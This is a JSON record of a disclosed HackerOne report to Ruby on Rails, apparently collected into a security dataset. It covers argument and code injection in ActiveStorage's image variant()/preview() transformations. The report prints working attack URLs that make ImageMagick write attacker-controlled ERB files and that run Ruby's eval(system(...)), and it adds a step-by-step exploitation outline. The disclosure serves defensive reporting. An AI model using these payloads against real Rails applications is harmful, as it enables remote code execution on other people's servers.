{
  "reported_to": "Ruby on Rails",
  "reported_by": "gquadros_ ",
  "title": "Argument/Code Injection via ActiveStorage's image transformation functionality",
  "content": "\nAffected components\nTested on:\nactivestorage 6.1.3.1\nimage_processing 1.12.1\nmini_magick 4.11.0\nFound by\nGabriel Quadros and Ricardo Silva from Conviso Application Security\nDescription\nIntro\nActiveStorage has an image transformation functionality [1, 2, 3, 4, 5, 6] which uses the concept of variants. By their own words [5]:\nImage blobs can have variants that are the result of a set of transformations applied to the original. These variants are used to create thumbnails, fixed-size avatars, or any other derivative image from the original.\nVariants rely on ImageProcessing gem for the actual transformations of the file, so you must add gem \"image_processing\" to your Gemfile if you wish to use variants. By default, images will be processed with ImageMagick using the MiniMagick gem, but you can also switch to the libvips processor operated by the ruby-vips gem).\nOne example of direct usage can be seen in the docs as:\nCode 65 Bytes\n1<%= image_tag user.avatar.variant(resize_to_limit: [100, 100]) %>\nThis will create an image tag with a variant URL, which when visited will return the avatar image transformed to the new size.\nAnother example uses the preview() method, which can be used to generate images from videos and PDF files. Once the preview image is generated, it also calls variant() under the hood.\nCode 144 Bytes\n1<ul>\n2  <% @message.files.each do |file| %>\n3    <li>\n4      <%= image_tag file.preview(resize_to_limit: [100, 100]) %>\n5    </li>\n6  <% end %>\n7</ul>\nVulnerabilities\nFirst, it is worth noting that the docs [3, 4, 7] do not state anything about it being insecure to pass user-supplied values as arguments to the variant()/preview() methods.\nRails uses the gem ImageProcessing [8] with MiniMagick by default, passing the transformations to the apply method.\nFile: activestorage/lib/active_storage/transformers/image_processing_transformer.rb\nCode 928 Bytes\n1 12 module ActiveStorage                                                          \n2 13   module Transformers                                                         \n3 14     class ImageProcessingTransformer < Transformer                            \n4 15       private                                                                 \n5 16         def process(file, format:)                                            \n6 17           processor.                                                          \n7 18             source(file).                                                     \n8 19             loader(page: 0).                                                  \n9 20             convert(format).                                                  \n10 21             apply(operations).                                                \n11 22             call                                                              \n12 23         end\nThis method passes these operations to the builder object by iterating over them and calling methods providing arguments, as can be seen below.\nFile: lib/image_processing/chainable.rb\nCode 1.39 KiB\n1 24     # Add multiple operations as a hash or an array.                          \n2 25     #                                                                         \n3 26     #   .apply(resize_to_limit: [400, 400], strip: true)                      \n4 27     #   # or                                                                  \n5 28     #   .apply([[:resize_to_limit, [400, 400]], [:strip, true])               \n6 29     def apply(operations)                                                     \n7 30       operations.inject(self) do |builder, (name, argument)|                  \n8 31         if argument == true || argument == nil                                \n9 32           builder.send(name)                                                  \n10 33         elsif argument.is_a?(Array)                                           \n11 34           builder.send(name, *argument)                                       \n12 35         elsif argument.is_a?(Hash)                                            \n13 36           builder.send(name, **argument)                                      \n14 37         else                                                                  \n15 38           builder.send(name, argument)                                        \n16 39         end                                                                   \n17 40       end                                                                     \n18 41     end\nAt some point, ImageProcessing passes these operations to MiniMagick via method calling as well:\nFile: lib/image_processing/processor.rb\nCode 1.06 KiB\n1 51     # Calls the operation to perform the processing. If the operation is      \n2 52     # defined on the processor (macro), calls the method. Otherwise calls the \n3 53     # operation directly on the accumulator object. This provides a common    \n4 54     # umbrella above defined macros and direct operations.                    \n5 55     def apply_operation(name, *args, &block)                                  \n6 56       receiver = respond_to?(name) ? self : @accumulator                      \n7 57                                                                               \n8 58       if args.last.is_a?(Hash)                                                \n9 59         kwargs = args.pop                                                     \n10 60         receiver.public_send(name, *args, **kwargs, &block)                   \n11 61       else                                                                    \n12 62         receiver.public_send(name, *args, &block)                             \n13 63       end                                                                     \n14 64     end\nMiniMagick receives these operations by defining a method_missing method, which takes the called methods and convert them to CLI options:\nFile: lib/mini_magick/tool.rb\nCode 1.15 KiB\n1260     ##                                                                        \n2261     # Any undefined method will be transformed into a CLI option              \n3262     #                                                                         \n4263     # @example                                                                \n5264     #   mogrify = MiniMagick::Tool.new(\"mogrify\")                             \n6265     #   mogrify.adaptive_blur(\"...\")                                          \n7266     #   mogrify.foo_bar                                                       \n8267     #   mogrify.command.join(\" \") # => \"mogrify -adaptive-blur ... -foo-bar\"  \n9268     #                                                                         \n10269     def method_missing(name, *args)                                           \n11270       option = \"-#{name.to_s.tr('_', '-')}\"                                   \n12271       self << option                                                          \n13272       self.merge!(args)                                                       \n14273       self                                                                    \n15274     end\nArgument Injection\nThe first problem arrises when a user-supplied value is passed as input to a hard-coded transformation, such as:\nCode 63 Bytes\n1<%= image_tag user.avatar.variant(resize: params[:new_size]) %>\nSince Rails params[] can be an array, one thing the attacker could do here is to pass an array and inject arbitrary arguments into the command to be executed (ImageMagick's convert by default).\nExample:\nCode 144 Bytes\n1https://example.com/controller?new_size[]=123&new_size[]=-set&new_size[]=comment&new_size[]=MYCOMMENT&new_size[]=-write&new_size[]=/tmp/file.erb\nThis is going to generate the following command:\nCode 138 Bytes\n1convert ORIGINAL_IMAGE -auto-orient -resize 123 -set comment MYCOMMENT -write /tmp/file.erb /tmp/image_processing20210328-23426-63rmm2.png\nWhich has the effect of writing a file containing user-controlled data anywhere in the system. This could be used easily to achieve RCE against Rails applications by overwriting ERB files, for example.\nUser-controlled transformation\nA second problem arrises when the user is also allowed to choose the kind of transformation to be applied, such as:\nCode 72 Bytes\n1<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>\nThis is still dangerous since ImageMagick's convert program has a lot of powerful command-line options and they can be used to compromise the application. For example, the user could pass:\nCode 55 Bytes\n1https://example.com/controller?t=write&v=/tmp/file2.erb\nThis is going to generate the following command:\nCode 104 Bytes\n1convert ORIGINAL_IMAGE -auto-orient -write /tmp/file2.erb /tmp/image_processing20210328-23426-63rmm2.png\nWhich has a similar effect as the previous attack, if we consider the original image is usually user-controlled.\nCode Injection\nThe third problem occurs due the way ImageProcessing passes the operations to the builder object (via send()). There is no filtering to check if the called method is a valid operation and this can be explored by an attacker to execute code.\nConsider the same pattern as before:\nCode 72 Bytes\n1<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>\nThe attacker could pass:\nCode 67 Bytes\n1https://example.com/controller?t=eval&v=system(\"touch /tmp/hacked\")\nAnd the Ruby code system(\"touch /tmp/hacked\") would be executed.\nRecomendations\nAdd some notes in the documentation to warn developers about the dangers of passing user-supplied data to the affected methods (variant/preview) without sanitization;\nFix the argument injection problem;\nImplement an operations whitelist in ImageProcessing, so it won't call unexpected methods.\nReferences\nhttps://guides.rubyonrails.org/active_storage_overview.html#transforming-images\nhttps://guides.rubyonrails.org/active_storage_overview.html#previewing-files\nhttps://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-variant\nhttps://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-preview\nhttps://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Variant.html\nhttps://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Preview.html\nhttps://github.com/rails/rails/issues/32989\nhttps://github.com/janko/image_processing\nImpact\nVulnerable code patterns could allow the attacker to achieve RCE.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1690519500,
  "report_url": "https://hackerone.com/reports/1154034",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Identify a Rails application using ActiveStorage with image transformation functionality."
    ],
    [
      2,
      "Craft a malicious URL or form input that passes user-controlled parameters to the variant() or preview() methods."
    ],
    [
      3,
      "Exploit the argument injection by passing an array that injects arbitrary arguments into the ImageMagick command."
    ],
    [
      4,
      "Alternatively, exploit code injection by passing a method name and argument that executes arbitrary Ruby code."
    ]
  ],
  "vuln_description": "The vulnerability allows for argument/code injection via ActiveStorage's image transformation functionality, which can lead to remote code execution (RCE) by manipulating user-supplied inputs passed to variant() or preview() methods.",
  "reason": "The vulnerability involves understanding the interaction between Rails' ActiveStorage, ImageProcessing gem, and MiniMagick, as well as the method chaining and argument passing mechanisms that lead to command injection. The attack requires knowledge of how these components interact and how to craft inputs that exploit this interaction.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves argument/code injection via ActiveStorage's image transformation functionality, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, but this vulnerability exploits image processing transformations and command injection, which operate at a different layer of the application.",
    "is_detectable": false
  }
}